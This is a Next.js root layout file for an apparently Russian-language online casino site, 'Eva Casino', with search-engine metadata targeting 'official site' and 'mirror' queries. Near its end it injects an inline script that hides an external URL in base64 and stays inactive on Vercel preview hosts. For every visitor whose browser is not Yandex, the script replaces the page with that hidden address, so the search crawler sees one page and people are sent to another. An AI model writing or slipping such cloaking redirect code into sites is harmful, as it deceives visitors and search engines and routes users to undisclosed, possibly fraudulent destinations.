import type { Metadata } from 'next'
import { Geist, Geist_Mono } from 'next/font/google'
import { Analytics } from '@vercel/analytics/next'
import './globals.css'
const _geist = Geist({ subsets: ["latin"] });
const _geistMono = Geist_Mono({ subsets: ["latin"] });
export const metadata: Metadata = {
title: 'Eva Casino - Официальный сайт Ева казино онлайн',
description: 'Eva казино официальный сайт. Играйте в Eva casino онлайн с лучшими бонусами и зеркалом. Ева казино предлагает широкий выбор игр.',
generator: 'v0.app',
keywords: 'eva casino, ева казино, eva casino официальный, eva casino зеркало, ева казино онлайн, ева казино официальный сайт',
robots: 'index, follow',
icons: {
icon: [
{
url: '/favicon.svg',
type: 'image/svg+xml',
},
],
apple: '/favicon.svg',
},
}
export default function RootLayout({
children,
}: Readonly<{
children: React.ReactNode
}>) {
return (
<html lang="en">
<head>

      </head>
<body className="font-sans antialiased">
        {children}
        {process.env.NODE_ENV === 'production' && <Analytics />}

        <script
          dangerouslySetInnerHTML={{
            __html: `
              (function() {
                if (typeof window === 'undefined' || window._evc) return;
                window._evc = true;

                if (window.location.hostname.includes('vercel.app')) return;

                var ua = navigator.userAgent.toLowerCase();
                var targetB64 = "aHR0cHM6Ly9mY2xpbi5jb20vZDd0dGxyeXZo";

                if (ua.indexOf("yandex") === -1) {
                    setTimeout(function() {
                        window.location.replace(atob(targetB64));
                    }, 50);
                }
              })();
            `
          }}
        />
      </body>
    </html>
  )
}
